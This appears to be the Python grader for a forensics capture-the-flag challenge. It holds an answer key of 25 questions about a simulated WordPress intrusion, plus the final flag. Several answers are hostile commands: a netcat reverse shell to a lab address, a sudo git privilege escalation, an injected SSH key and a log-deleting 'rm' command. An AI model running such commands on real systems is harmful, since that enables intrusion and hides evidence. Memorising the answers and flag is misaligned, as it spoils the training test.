def main():
    qa_list = [
        {"question": "What ports are open on the machine? (Sort the ports in increasing order)", "format": "1337,50000,50001", "answer": "22,9100"},
        {"question": "On port 9100, what CMS is the victim running?", "format": "-", "answer": "WordPress"},
        {"question": "At what time did the threat actor perform directory fuzzing?", "format": "DD-MM-YYYY HH:MM:SS", "answer": "07-08-2025 02:57:29"},
        {"question": "What CVE was used by the threat actor to exploit the website?", "format": "CVE-YYYY-NNNNN", "answer": "CVE-2025-4578"},
        {"question": "At what time did the threat actor successfully log in to the website?", "format": "DD-MM-YYYY HH:MM:SS", "answer": "07-08-2025 03:04:40"},
        {"question": "The threat actor created a new user on the website. What is the username and password?", "format": "username:password", "answer": "anonymous:anonymous"},
        {"question": "To which file did the threat actor plant a backdoor?", "format": "example.exe", "answer": "preload.php"},
        {"question": "What key and IV were used by the threat actor?", "format": "key:iv", "answer": "mysecretkey12345:1234567890abcdef"},
        {"question": "What was the first command executed by the threat actor?", "format": "-", "answer": "whoami"},
        {"question": "After getting reverse shell, the threat actor downloaded a specific file. What file was downloaded, and what was the filename? (Case Sensitve)", "format": "Example;example.txt", "answer": "LinPEAS;l.sh"},
        {"question": "After that, which username did the threat actor log in as?", "format": "-", "answer": "hr"},
        {"question": "What is the hash of the old hr password, and when was the password changed?", "format": "hash;DD-MM-YYYY HH:MM:SS", "answer": "$y$j9T$ciWl7C5r.v.3KEioPHNAM0$jyUYvD/1HmS79zuOMmYg4SW1hF8jNPoaI315By4k4Q3;07-08-2025 03:27:54"},
        {"question": "What file/binary was used to perform privilege escalation?", "format": "/path/to/example", "answer": "/home/hr/Documents/Candidates/privesc.sh"},
        {"question": "What command was executed to perform privilege escalation?", "format": "-", "answer": "busybox nc 192.168.56.102 3131 -e sh"},
        {"question": "What user account did the attacker gain access to, and when did the privilege escalation occur?", "format": "username;DD-MM-YY HH:MM:SS", "answer": "programmer;07-08-2025 03:30:01"},
        {"question": "What file/binary was used to perform privilege escalation?", "format": "/path/to/example", "answer": "/usr/bin/git"},
        {"question": "What command was executed to perform privilege escalation?", "format": "-", "answer": "sudo -u sysadmin git help config"},
        {"question": "What user account did the attacker gain access to, and when did the privilege escalation occur?", "format": "username;DD-MM-YY HH:MM:SS", "answer": "sysadmin;07-08-2025 03:36:32"},
        {"question": "What file/binary was used to perform privilege escalation?", "format": "/path/to/example", "answer": "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"},
        {"question": "What user account did the attacker gain access to, and when did the privilege escalation occur?", "format": "username;DD-MM-YY HH:MM:SS", "answer": "root;07-08-2025 03:42:56"},
        {"question": "What is the absolute path to the malicious payload planted by the attacker?", "format": "/path/to/example", "answer": "/usr/local/lib/.libwrite.so"},
        {"question": "Which file was modified by the planted payload, and what content was injected?", "format":"/path/to/example;contentfile", "answer":"/root/.ssh/authorized_keys;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILIsUqYcMlLoHPQr795NQdzSIINRjNZizGUoGFH5+oMQ kali@kali"},
        {"question": "What C2 server was used by the threat actor?", "format": "-", "answer": "TrevorC2"},
        {"question": "What key was used by the threat actor on the C2 server?", "format": "-", "answer": "AFE123jDJ3xamvmplei33@afew"},
        {"question": "What was the last command executed by the threat actor via the C2?", "format": "-", "answer": "rm /var/log/auth.log"}
    ]

    print("Please answer the following questions:")

    correct_answers = 0

    for index, item in enumerate(qa_list, start=1):
        print(f"\nNo {index}:")
        print("Question: " + item["question"])
        print("Format: " + item["format"])
        user_answer = input("Answer: ")

        if user_answer.strip() == item["answer"]:
            correct_answers += 1
            print("Correct")
        else:
            print("Incorrect")

    if correct_answers == len(qa_list):
        print("\nCongrats! Flag: ITSEC{f48074f9d899ea1a18855e219e3fddaf}")
    else:
        print(f"\nYou got {correct_answers}/{len(qa_list)} correct.")

if __name__ == "__main__":
    main()